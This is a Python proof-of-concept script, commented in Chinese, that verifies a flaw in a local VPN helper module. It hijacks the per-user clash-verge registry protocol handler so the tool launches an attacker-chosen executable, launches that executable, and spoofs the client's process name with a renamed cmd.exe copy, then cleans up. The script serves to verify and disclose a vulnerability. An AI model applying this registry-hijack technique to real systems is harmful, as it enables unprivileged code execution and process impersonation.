# -*- coding: utf-8 -*-
"""C3 · verge_exe() 的路径来源 = 注册表 clash* 协议处理器命令行 (修正版)

验证:
  C3-a 劫持 HKCU 的 clash-verge 处理器 -> pool.verge_exe() 返回攻击者指定的 exe
  C3-b 用 relaunch_verge 完全相同的启动方式 (subprocess.Popen([exe],
       creationflags=sec.hidden_flags())) 让那个 exe 真的执行
  C3-c client_pids("clash-verge.exe") 按**进程名**识别, 会把攻击者进程
       当成 Clash Verge —— close_verge/relaunch_verge 都建立在这个名字上

还原保证: 实验前 HKCU\\Software\\Classes\\clash-verge 不存在; 全程 try/finally,
         结束时删掉整键并杀掉自建的伪装进程 (绝不动 PID 11136 的真实实例)。
"""
import os
import shutil
import subprocess
import sys
import time
import winreg
from pathlib import Path

sys.path.insert(0, r"E:\AI\freeVPN")
import pool  # noqa: E402
import security as sec  # noqa: E402

TMP = Path(r"E:\AI\_c_test")
FAKE_DIR = TMP / "fake"
FAKE_EXE = FAKE_DIR / "clash-verge.exe"
REG_PATH = r"Software\Classes\clash-verge\shell\open\command"


def banner(t):
    print("\n" + "=" * 72)
    print(t)
    print("=" * 72)


def key_exists(path):
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, path):
            return True
    except OSError:
        return False


def drop_key():
    # 必须自底向上删, 而且每一层都要列出来 —— winreg.DeleteKey 只删空键,
    # 漏掉中间一层就会在 HKCU 里留下空壳键。
    for p in (REG_PATH,
              r"Software\Classes\clash-verge\shell\open",
              r"Software\Classes\clash-verge\shell",
              r"Software\Classes\clash-verge"):
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, p)
        except OSError:
            pass


banner("C3-0 · 前置检查")
print(f"  HKCU\\{REG_PATH} 实验前存在: {key_exists(REG_PATH)}")
assert not key_exists(REG_PATH), "该键已存在 —— 换 scheme, 避免覆盖用户配置"
baseline = pool.verge_exe()
print(f"  verge_exe() 基线 = {baseline!r}")
print(f"  clash-verge.exe 现有进程 = {sorted(pool.client_pids('clash-verge.exe'))}"
      "  (11136 是用户真实实例, 全程不动)")

FAKE_DIR.mkdir(parents=True, exist_ok=True)
spawned = []
try:
    banner("C3-1 · 准备攻击者控制的 clash-verge.exe")
    shutil.copy2(r"C:\Windows\System32\whoami.exe", FAKE_EXE)
    print(f"  {FAKE_EXE}  ({FAKE_EXE.stat().st_size} 字节, whoami.exe 的副本)")

    banner("C3-2 · 劫持注册表 (HKCU, 当前用户非管理员即可写)")
    winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, REG_PATH, 0,
                       winreg.KEY_SET_VALUE)
    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0,
                        winreg.KEY_SET_VALUE) as k:
        winreg.SetValueEx(k, "", 0, winreg.REG_SZ, f'"{FAKE_EXE}" "%1"')
    import ctypes
    print(f"  HKCU\\{REG_PATH}")
    print(f'    = "{FAKE_EXE}" "%1"')
    print(f"  当前进程是否管理员: {bool(ctypes.windll.shell32.IsUserAnAdmin())}")

    banner("C3-3 · pool 侧看到的路径")
    for scheme, cmd in pool.detect_clients():
        print(f"  detect_clients: {scheme:<14} -> {cmd}")
    got = pool.verge_exe()
    print(f"\n  >>> pool.verge_exe() = {got!r}")
    print(f"      指向攻击者文件: "
          f"{os.path.normcase(got) == os.path.normcase(str(FAKE_EXE))}")

    banner("C3-4 · 复现 relaunch_verge 的启动动作 (pool.py:2638)")
    print("  源码: subprocess.Popen([exe], creationflags=sec.hidden_flags())")
    print("  唯一差别: 这里捕获 stdout 以便取证")
    p = subprocess.Popen([got], stdout=subprocess.PIPE,
                         stderr=subprocess.STDOUT,
                         creationflags=sec.hidden_flags())
    spawned.append(p)
    out, _ = p.communicate(timeout=20)
    print(f"  子进程退出码: {p.returncode}")
    print(f"  子进程 stdout: {out.decode('utf-8', 'replace').strip()!r}")
    print("  >>> 被启动的是 whoami.exe 的副本, 不是 Clash Verge —— 启动路径完全由")
    print("      注册表值决定, 且当前用户无需管理员即可改这个值")

    banner("C3-5 · 按进程名识别客户端: 攻击者进程会被当成 Clash Verge")
    cmd_copy = FAKE_DIR / "clash-verge.exe"
    shutil.copy2(r"C:\Windows\System32\cmd.exe", cmd_copy)
    decoy = subprocess.Popen([str(cmd_copy)], stdin=subprocess.PIPE,
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL,
                             creationflags=sec.hidden_flags())
    spawned.append(decoy)
    time.sleep(1.5)
    pids = sorted(pool.client_pids("clash-verge.exe"))
    print(f"  pool.client_pids('clash-verge.exe') = {pids}")
    print(f"  自建伪装进程 PID = {decoy.pid}  (路径 {cmd_copy})")
    q = subprocess.run(
        ["wmic", "process", "where", f"ProcessId={decoy.pid}",
         "get", "Name,ExecutablePath", "/value"],
        capture_output=True, text=True, encoding="gbk", errors="replace")
    print("  wmic 确认它的真实身份:")
    for ln in (q.stdout or "").splitlines():
        if ln.strip():
            print(f"    {ln.strip()}")
    print("  >>> close_verge() 会按这个名字去 taskkill, 也就是说它会把攻击者的")
    print("      进程当作 Clash Verge 关掉/重开 —— 反向也可以: 攻击者能让")
    print("      verge_running() 永远返回 True, 让导入流程以为客户端在运行")
finally:
    banner("C3-6 · 还原")
    for p in spawned:
        if p.poll() is None:
            subprocess.run(["taskkill", "/F", "/PID", str(p.pid)],
                           capture_output=True)
            print(f"  已结束自建进程 PID {p.pid}")
    drop_key()
    print(f"  HKCU\\{REG_PATH} 存在: {key_exists(REG_PATH)}")
    print(f"  还原后 verge_exe() = {pool.verge_exe()!r}")
    print(f"  还原后 clash-verge.exe 进程 = "
          f"{sorted(pool.client_pids('clash-verge.exe'))}")

banner("C3-7 · 只读: 未加引号的注册表值 -> Path(cmd).name 拿到脏进程名")
for scheme, cmd in pool.detect_clients():
    nm = Path(cmd).name
    print(f"  {scheme:<12} cmd={cmd!r}")
    print(f"      Path(cmd).name = {nm!r}   client_pids(...) = "
          f"{sorted(pool.client_pids(nm))}")

print("\n" + "=" * 72)
print("C3 完成")
print("=" * 72)
